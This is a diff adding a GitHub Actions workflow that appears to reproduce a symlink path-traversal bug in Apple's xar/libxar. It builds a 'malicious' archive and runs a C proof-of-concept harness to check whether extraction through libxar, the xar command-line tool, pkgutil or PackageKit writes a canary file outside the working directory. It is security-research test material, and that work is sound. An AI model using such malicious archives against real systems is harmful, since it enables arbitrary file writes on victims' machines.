@@ -1,0 +1,257 @@
+name: gate_a_d_run29
+
+on:
+  workflow_dispatch:
+
+jobs:
+  gate_a_d:
+    runs-on: macos-15
+    permissions:
+      contents: write
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: macOS version
+        run: sw_vers
+
+      - name: Clone xar-501 at 7c1427d
+        run: |
+          git clone https://github.com/apple-oss-distributions/xar.git /tmp/xar_src
+          cd /tmp/xar_src && git checkout 7c1427d
+
+      - name: Build libxar at 7c1427d
+        continue-on-error: true
+        run: |
+          cd /tmp/xar_src/xar
+          ./configure --prefix=/tmp/xar_inst 2>&1 | tail -5
+          make -j4 2>&1 | tail -10
+          make install 2>&1 | tail -5
+          ls -la /tmp/xar_inst/lib/ || echo "(libxar build failed)"
+          echo "=== libxar dylib check ==="
+          test -f /tmp/xar_inst/lib/libxar.1.dylib && echo "LIBXAR_BUILT=YES" || echo "LIBXAR_BUILT=NO"
+
+      - name: Build malicious XAR r29
+        run: |
+          mkdir -p /tmp/xar_build
+          cp build_xar_r27.c /tmp/xar_build/build_xar_r29.c
+          sed -i '' 's/RUN27/RUN29/g' /tmp/xar_build/build_xar_r29.c
+          cd /tmp/xar_build
+          cc -O2 -o build_xar_r29 build_xar_r29.c -lz
+          ./build_xar_r29
+          mv malicious_ga.xar malicious_r29.xar
+          echo "=== Archive SHA256 ==="
+          shasum -a 256 malicious_r29.xar
+          ls -la malicious_r29.xar
+
+      # ===== GATE D =====
+      - name: Gate D PRE — clear canary
+        run: |
+          rm -f /tmp/xar_gated_canary_macos.txt
+          echo "PRE Gate D: $(ls /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo ABSENT)"
+
+      - name: Gate D — run PoC (libxar 7c1427d)
+        continue-on-error: true
+        run: |
+          mkdir -p /tmp/gate_d_r29
+          cat > /tmp/gate_d_r29/poc_d.c << 'C_EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <dlfcn.h>
+          #include <unistd.h>
+          #include <sys/stat.h>
+          #include <limits.h>
+          typedef void* xar_t; typedef void* xar_file_t; typedef void* xar_iter_t;
+          int main(int argc, char *argv[]) {
+              if (!argv[1]) { fprintf(stderr,"usage: poc_d <xar>\n"); return 1; }
+              printf("[D] libxar path: /tmp/xar_inst/lib/libxar.1.dylib\n");
+              struct stat s0;
+              if (stat("/tmp/xar_inst/lib/libxar.1.dylib",&s0)!=0) {
+                  fprintf(stderr,"[D] ERROR: libxar.1.dylib not found\n"); return 1;
+              }
+              void *h=dlopen("/tmp/xar_inst/lib/libxar.1.dylib",RTLD_LAZY);
+              if(!h){fprintf(stderr,"[D] dlopen:%s\n",dlerror());return 1;}
+              typedef xar_t (*xar_open_fn)(const char*,int32_t);
+              typedef int   (*xar_extract_fn)(xar_t,xar_file_t);
+              typedef xar_iter_t (*xar_iter_new_fn)(void);
+              typedef xar_file_t (*xar_file_first_fn)(xar_t,xar_iter_t);
+              typedef xar_file_t (*xar_file_next_fn)(xar_iter_t);
+              typedef int   (*xar_close_fn)(xar_t);
+              typedef void  (*xar_iter_free_fn)(xar_iter_t);
+              xar_open_fn      fn_o =(xar_open_fn)      dlsym(h,"xar_open");
+              xar_extract_fn   fn_e =(xar_extract_fn)   dlsym(h,"xar_extract");
+              xar_iter_new_fn  fn_in=(xar_iter_new_fn)  dlsym(h,"xar_iter_new");
+              xar_file_first_fn fn_f=(xar_file_first_fn)dlsym(h,"xar_file_first");
+              xar_file_next_fn fn_n =(xar_file_next_fn) dlsym(h,"xar_file_next");
+              xar_close_fn     fn_c =(xar_close_fn)     dlsym(h,"xar_close");
+              xar_iter_free_fn fn_if=(xar_iter_free_fn) dlsym(h,"xar_iter_free");
+              char abs[4096];
+              realpath(argv[1],abs);
+              printf("[D] archive: %s\n",abs);
+              mkdir("/tmp/gate_d_r29_work",0755); chdir("/tmp/gate_d_r29_work");
+              xar_t x=fn_o(abs,0);
+              if(!x){fprintf(stderr,"[D] xar_open failed\n");return 1;}
+              xar_iter_t xi=fn_in();
+              int entry=0;
+              for(xar_file_t f=fn_f(x,xi);f;f=fn_n(xi)){
+                  int rc=fn_e(x,f);
+                  printf("[D] entry%d xar_extract rc=%d\n",++entry,rc);
+              }
+              fn_if(xi); fn_c(x);
+              printf("[D] workdir:\n");
+              system("ls -laR /tmp/gate_d_r29_work/ 2>/dev/null");
+              struct stat st;
+              if(stat("/tmp/xar_gated_canary_macos.txt",&st)==0){
+                  printf("[!] GATE_D=PASS canary outside workdir\n"); return 0;
+              }
+              printf("[-] GATE_D=FAIL canary absent\n"); return 1;
+          }
+          C_EOF
+          cc -O2 -o /tmp/gate_d_r29/poc_d /tmp/gate_d_r29/poc_d.c \
+            -Wl,-rpath,/tmp/xar_inst/lib
+          /tmp/gate_d_r29/poc_d /tmp/xar_build/malicious_r29.xar
+          echo "=== Gate D POST ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_D=PASS" || echo "GATE_D=FAIL"
+          echo "=== Canary content ==="
+          cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo "(absent)"
+
+      # ===== GATE A — Method 1: system xar CLI =====
+      - name: Gate A PRE-1 — clear canary + probe system xar
+        run: |
+          rm -f /tmp/xar_gated_canary_macos.txt
+          echo "=== System xar CLI probe ==="
+          which xar 2>/dev/null || echo "(no xar in PATH)"
+          ls -la /usr/bin/xar 2>/dev/null || echo "(no /usr/bin/xar)"
+          otool -L /usr/bin/xar 2>/dev/null | head -10 || echo "(otool: n/a)"
+          echo "PRE Gate A-1: canary=$(ls /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo ABSENT)"
+
+      - name: Gate A-1 — system xar CLI extraction
+        continue-on-error: true
+        run: |
+          if [ ! -x /usr/bin/xar ]; then echo "GATE_A_SYSXAR=SKIP (no /usr/bin/xar)"; exit 0; fi
+          mkdir -p /tmp/gate_a_sysxar
+          cd /tmp/gate_a_sysxar
+          echo "Running: /usr/bin/xar -xf /tmp/xar_build/malicious_r29.xar"
+          /usr/bin/xar -xf /tmp/xar_build/malicious_r29.xar 2>&1 || true
+          echo "=== workdir after xar -xf ==="
+          ls -laR /tmp/gate_a_sysxar/
+          echo "=== canary check ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A_SYSXAR=PASS" || echo "GATE_A_SYSXAR=FAIL"
+          echo "=== canary content ==="
+          cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo "(absent)"
+
+      # ===== GATE A — Method 2: pkgutil --expand (clean test) =====
+      - name: Gate A PRE-2 — clear canary
+        run: |
+          rm -f /tmp/xar_gated_canary_macos.txt
+          echo "PRE Gate A-2 (pkgutil): canary=$(ls /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo ABSENT)"
+
+      - name: Gate A-2 — pkgutil --expand clean test
+        continue-on-error: true
+        run: |
+          rm -rf /tmp/gate_a_pkgutil && mkdir -p /tmp/gate_a_pkgutil
+          echo "Running: pkgutil --expand malicious_r29.xar /tmp/gate_a_pkgutil/out"
+          pkgutil --expand /tmp/xar_build/malicious_r29.xar /tmp/gate_a_pkgutil/out 2>&1 || true
+          echo "=== pkgutil workdir ==="
+          ls -laR /tmp/gate_a_pkgutil/ 2>/dev/null
+          echo "=== canary check ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A_PKGUTIL=PASS" || echo "GATE_A_PKGUTIL=FAIL"
+          echo "=== canary content ==="
+          cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo "(absent)"
+
+      # ===== GATE A — Method 3: PackageKit C API =====
+      - name: Gate A PRE-3 — clear canary
+        run: |
+          rm -f /tmp/xar_gated_canary_macos.txt
+          echo "PRE Gate A-3 (PKC): canary=$(ls /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo ABSENT)"
+
+      - name: Gate A-3 — PackageKit C API
+        continue-on-error: true
+        run: |
+          mkdir -p /tmp/gate_a_pkc
+          cp poc_gate_a_r21.c /tmp/gate_a_pkc/poc_r29.c
+          cc -O2 -o /tmp/gate_a_pkc/poc_r29 /tmp/gate_a_pkc/poc_r29.c
+          cd /tmp/gate_a_pkc
+          ./poc_r29 /tmp/xar_build/malicious_r29.xar 2>&1 | tee poc_r29_out.txt
+          echo "=== canary check ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A_PKC=PASS" || echo "GATE_A_PKC=FAIL"
+          echo "=== canary content ==="
+          cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo "(absent)"
+
+      - name: Enumerate system xar surface
+        if: always()
+        run: |
+          echo "=== /usr/bin/xar ==="
+          ls -la /usr/bin/xar 2>/dev/null || echo "absent"
+          echo "=== xar version ==="
+          /usr/bin/xar --version 2>/dev/null || echo "n/a"
+          echo "=== otool -L /usr/bin/xar ==="
+          otool -L /usr/bin/xar 2>/dev/null || echo "n/a"
+          echo "=== find libxar in system ==="
+          find /usr/lib /usr/bin /System/Library -name "*xar*" 2>/dev/null | head -20
+          echo "=== PackageKit xar symbols ==="
+          nm -gU /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/PackageKit \
+            2>/dev/null | grep -i "^.*xar" | head -10 || echo "(none)"
+
+      - name: Collect and push results
+        if: always()
+        run: |
+          cd $GITHUB_WORKSPACE
+          XAR_SHA=$(shasum -a 256 /tmp/xar_build/malicious_r29.xar 2>/dev/null || echo "n/a")
+          {
+            echo "=== RUN 29 RESULTS (clean Gate A) ==="
+            echo "date: $(date -u)"
+            echo "archive_sha256: $XAR_SHA"
+            echo ""
+            echo "=== macOS version ==="
+            sw_vers
+            echo ""
+            echo "=== GATE D ==="
+            cat /tmp/gate_d_r29/poc_d.c > /dev/null 2>&1 || true
+            ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null
+            cat /tmp/gate_d_r29_work/.* /tmp/gate_d_r29_work/* 2>/dev/null | head -5 || true
+            ls -laR /tmp/gate_d_r29_work/ 2>/dev/null | head -15
+            echo ""
+            echo "=== GATE A-1: system xar CLI ==="
+            echo "PRE: canary cleared"
+            ls -laR /tmp/gate_a_sysxar/ 2>/dev/null | head -15
+            echo ""
+            echo "=== GATE A-2: pkgutil --expand ==="
+            echo "PRE: canary cleared"
+            ls -laR /tmp/gate_a_pkgutil/ 2>/dev/null | head -15
+            echo ""
+            echo "=== GATE A-3: PackageKit C API ==="
+            echo "PRE: canary cleared"
+            cat /tmp/gate_a_pkc/poc_r29_out.txt 2>/dev/null || echo "(no output)"
+            echo ""
+            echo "=== FINAL CANARY STATE ==="
+            ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+              echo "canary PRESENT" || echo "canary ABSENT"
+            cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || true
+            echo ""
+            echo "=== system xar binary ==="
+            ls -la /usr/bin/xar 2>/dev/null || echo "(absent)"
+            otool -L /usr/bin/xar 2>/dev/null || echo "n/a"
+            echo ""
+            echo "=== Gate D workdir ==="
+            ls -laR /tmp/gate_d_r29_work/ 2>/dev/null
+          } > run29_results.log
+          cat run29_results.log
+          git config user.email "ci@gate-a"
+          git config user.name "Gate A CI"
+          git add run29_results.log
+          git commit -m "Run 29 results — clean Gate A [ci skip]" || echo "(nothing to commit)"
+          git push https://YuvalFradkin1:REDACTED_PAT@github.com/YuvalFradkin1/xar-symlink2-repro.git HEAD:main
+
+      - name: Upload Run 29 artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gate-a-d-run29-evidence
+          path: run29_results.log
+          retention-days: 30
